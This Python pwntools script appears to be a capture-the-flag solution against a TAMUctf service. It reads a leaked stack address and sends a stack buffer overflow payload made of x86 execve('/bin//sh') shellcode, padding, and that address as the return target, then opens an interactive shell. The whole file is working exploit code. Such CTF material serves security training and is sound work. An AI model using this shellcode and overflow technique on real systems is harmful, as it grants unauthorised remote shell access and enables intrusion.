from pwn import *

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
r = remote("pwn.tamuctf.com", 4323)

#Take this, you might need it on your journey 0xfff3083e!
addr_s = int(r.recvline().strip()[-9:-1], 16)

payload = shellcode + "A" * (0x12A - 23 + 4) + p32(addr_s)

r.sendline(payload)

r.interactive()

r.close()
